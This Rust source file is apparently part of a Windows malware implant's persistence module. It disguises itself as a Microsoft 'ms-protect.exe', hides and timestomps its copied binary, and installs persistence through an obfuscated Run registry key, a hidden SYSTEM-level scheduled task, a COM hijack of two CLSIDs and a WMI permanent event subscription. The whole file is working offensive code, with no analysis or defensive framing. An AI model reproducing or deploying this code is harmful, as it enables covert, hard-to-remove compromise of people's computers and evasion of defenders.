use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::settings::RecoveryControl;
use directories::BaseDirs;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use tracing::{debug, error, info, warn};
use winreg::{RegKey, enums::*};

pub async fn install_persistence() {
    if !RecoveryControl::global().persistence_enabled() {
        debug!("persistence is disabled");
        return;
    }

    if let Err(err) = install_persistence_impl().await {
        error!(error = ?err, "failed to install persistence");
    }
}

pub fn is_running_from_persistence() -> bool {
    if let Some(base_dirs) = BaseDirs::new() {
        let data_dir = base_dirs
            .data_local_dir()
            .join("Microsoft")
            .join("Protect")
            .join("S-1-5-21-2026");
        let target_exe = data_dir.join("ms-protect.exe");
        
        if let Ok(current) = env::current_exe() {
            return current == target_exe;
        }
    }
    false
}

async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?;
    let base_dirs = BaseDirs::new().ok_or("failed to determine base directories")?;

    let data_dir = base_dirs
        .data_local_dir()
        .join("Microsoft")
        .join("Protect")
        .join("S-1-5-21-2026");
    if !data_dir.exists() {
        fs::create_dir_all(&data_dir)?;
        set_hidden_system(&data_dir);
    }

    let target_exe = data_dir.join("ms-protect.exe");

    if current_exe == target_exe {
        debug!("running from persistence location");
        ensure_persistence_mechanisms(&target_exe)?;
        return Ok(());
    }

    info!(
        current = %current_exe.display(),
        target = %target_exe.display(),
        "installing persistence artifact"
    );

    match fs::copy(&current_exe, &target_exe) {
        Ok(_) => {
            set_hidden_system(&target_exe);
            timestomp(&target_exe, &PathBuf::from(r"C:\Windows\explorer.exe"));
        }
        Err(err) => {
            warn!(error = %err, "failed to copy executable (might be running)");
            if !target_exe.exists() {
                return Err(err.into());
            }
        }
    }

    ensure_persistence_mechanisms(&target_exe)?;
    Ok(())
}

fn set_hidden_system(path: &Path) {
    #[cfg(target_os = "windows")]
    {
        let _ = Command::new("attrib")
            .args(&["+h", "+s", path.to_string_lossy().as_ref()])
            .output();
    }
}

fn timestomp(target: &Path, reference: &Path) {
    #[cfg(target_os = "windows")]
    {
        use ntapi::ntioapi::{
            FILE_BASIC_INFORMATION, FileBasicInformation, NtQueryInformationFile,
            NtSetInformationFile,
        };
        use std::mem::MaybeUninit;
        use windows::Win32::Foundation::HANDLE;
        use windows::Win32::Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_READ_ATTRIBUTES, FILE_SHARE_READ,
            FILE_WRITE_ATTRIBUTES, OPEN_EXISTING, SYNCHRONIZE,
        };
        use windows::core::PCWSTR;

        unsafe {
            let ref_path_w: Vec<u16> = reference
                .to_string_lossy()
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let h_ref = CreateFileW(
                PCWSTR(ref_path_w.as_ptr()),
                FILE_READ_ATTRIBUTES.0,
                FILE_SHARE_READ,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                HANDLE::default(),
            );

            if let Ok(h_ref) = h_ref {
                let mut io_status = MaybeUninit::uninit();
                let mut basic_info = MaybeUninit::<FILE_BASIC_INFORMATION>::uninit();

                let status = NtQueryInformationFile(
                    h_ref.0 as _,
                    io_status.as_mut_ptr() as _,
                    basic_info.as_mut_ptr() as _,
                    std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
                    FileBasicInformation,
                );

                if status == 0 {
                    let basic_info = basic_info.assume_init();
                    let target_path_w: Vec<u16> = target
                        .to_string_lossy()
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect();
                    let h_target = CreateFileW(
                        PCWSTR(target_path_w.as_ptr()),
                        (FILE_WRITE_ATTRIBUTES | SYNCHRONIZE).0,
                        FILE_SHARE_READ,
                        None,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        HANDLE::default(),
                    );

                    if let Ok(h_target) = h_target {
                        let mut io_status_set = MaybeUninit::uninit();
                        let mut info_to_set = basic_info;

                        NtSetInformationFile(
                            h_target.0 as _,
                            io_status_set.as_mut_ptr() as _,
                            &mut info_to_set as *mut _ as _,
                            std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
                            FileBasicInformation,
                        );
                    }
                }
            }
        }
    }
}

fn ensure_persistence_mechanisms(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let _ = ensure_registry_run_key(path);
    let _ = ensure_hidden_scheduled_task(path);
    let _ = ensure_com_hijack_refined(path);
    let _ = ensure_wmi_event_consumer(path);
    Ok(())
}

fn ensure_registry_run_key(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_key = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        KEY_SET_VALUE,
    )?;

    let app_name = deobf(&[
        0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xF5, 0xD2, 0xCE, 0xC9, 0xED, 0xCF,
        0xD2, 0xC9, 0xD8, 0xDE, 0xC9, 0xD4, 0xD2, 0xD3,
    ]);
    run_key.set_value(app_name, &path.to_string_lossy().as_ref())?;
    Ok(())
}

fn is_admin() -> bool {
    let output = std::process::Command::new("net").arg("session").output();
    match output {
        Ok(out) => out.status.success(),
        Err(_) => false,
    }
}

fn ensure_hidden_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let task_name = deobf(&[
        0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xEA, 0xD4, 0xD3, 0xD9, 0xD2, 0xCA,
        0xCE, 0xEE, 0xC4, 0xCE, 0xC9, 0xD8, 0xD0, 0x97, 0xD4, 0xDC, 0xD3, 0xD2, 0xCE, 0xC9, 0xD4,
        0xDE, 0xCE,
    ]);
    let exe_path = path.to_string_lossy().replace("\"", "\\\"");
    let script = if is_admin() {
        format!(
            "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force",
            exe_path, task_name
        )
    } else {
        format!(
            "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Settings $settings -Force",
            exe_path, task_name
        )
    };

    let _ = Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
        .output();
    Ok(())
}

fn ensure_com_hijack_refined(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let clsids = [
        "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruLongList
        "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MmcDmp
    ];

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path_str = path.to_string_lossy();

    for clsid in clsids {
        let base_path = format!(r"Software\Classes\CLSID\{}", clsid);

        if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\LocalServer32", base_path)) {
            let _ = key.set_value("", &path_str.as_ref());
        }

        if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\InprocServer32", base_path)) {
            let _ = key.set_value("", &path_str.as_ref());
            let _ = key.set_value("ThreadingModel", &"Both");
        }
    }
    Ok(())
}

fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    if !is_admin() {
        return Ok(());
    }

    unsafe {
        use windows::Win32::System::Com::*;
        use windows::Win32::System::Wmi::*;
        use windows::Win32::System::Variant::*;
        use windows::core::{BSTR, PCWSTR};

        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);

        let locator: IWbemLocator = CoCreateInstance(&WbemLocator, None, CLSCTX_INPROC_SERVER)?;
        let services = locator.ConnectServer(
            &BSTR::from("root\\subscription"),
            None,
            None,
            None,
            0,
            None,
            None,
        )?;

        CoSetProxyBlanket(
            &services,
            10, // RPC_C_AUTHN_WINNT
            0,  // RPC_C_AUTHZ_NONE
            None,
            RPC_C_AUTHN_LEVEL_CALL,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            None,
            EOAC_NONE,
        )?;

        let task_name = "WinMgmtEngineHealth";
        let exe_path = path.to_string_lossy();

        let put_prop = |inst: &IWbemClassObject, name: &str, value: &str| -> Result<(), Box<dyn std::error::Error>> {
            let mut v = VARIANT::default();
            let bstr_val = BSTR::from(value);
            
            let v_inner = &mut v.Anonymous.Anonymous;
            v_inner.vt = VT_BSTR;
            v_inner.Anonymous.bstrVal = std::mem::ManuallyDrop::new(bstr_val);
            let name_bstr = BSTR::from(name);
            inst.Put(PCWSTR::from_raw(name_bstr.as_wide().as_ptr()), 0, &v, 0).map_err(|e| e.to_string())?;
            
            Ok(())
        };

        let mut filter_class = None;
        let filter_class_name = BSTR::from("__EventFilter");
        services.GetObject(&filter_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut filter_class), None).map_err(|e| e.to_string())?;
        let filter_class = filter_class.ok_or("failed to get __EventFilter class")?;
        
        let filter_inst = filter_class.SpawnInstance(0).map_err(|e| e.to_string())?;

        put_prop(&filter_inst, "Name", task_name)?;
        put_prop(&filter_inst, "QueryLanguage", "WQL")?;
        put_prop(&filter_inst, "Query", "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'")?;
        put_prop(&filter_inst, "EventNamespace", "root\\cimv2")?;

        services.PutInstance(&filter_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;

        let mut consumer_class = None;
        let consumer_class_name = BSTR::from("CommandLineEventConsumer");
        services.GetObject(&consumer_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut consumer_class), None).map_err(|e| e.to_string())?;
        let consumer_class = consumer_class.ok_or("failed to get CommandLineEventConsumer class")?;
        
        let consumer_inst = consumer_class.SpawnInstance(0).map_err(|e| e.to_string())?;

        put_prop(&consumer_inst, "Name", task_name)?;
        put_prop(&consumer_inst, "CommandLineTemplate", &exe_path)?;

        services.PutInstance(&consumer_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;

        let mut binding_class = None;
        let binding_class_name = BSTR::from("__FilterToConsumerBinding");
        services.GetObject(&binding_class_name, WBEM_GENERIC_FLAG_TYPE(0), None, Some(&mut binding_class), None).map_err(|e| e.to_string())?;
        let binding_class = binding_class.ok_or("failed to get __FilterToConsumerBinding class")?;
        
        let binding_inst = binding_class.SpawnInstance(0).map_err(|e| e.to_string())?;

        let filter_path = format!("__EventFilter.Name=\"{}\"", task_name);
        let consumer_path = format!("CommandLineEventConsumer.Name=\"{}\"", task_name);

        put_prop(&binding_inst, "Filter", &filter_path)?;
        put_prop(&binding_inst, "Consumer", &consumer_path)?;

        services.PutInstance(&binding_inst, WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _), None, None).map_err(|e| e.to_string())?;

        debug!("WMI permanent event subscription installed successfully");
    }

    Ok(())
}
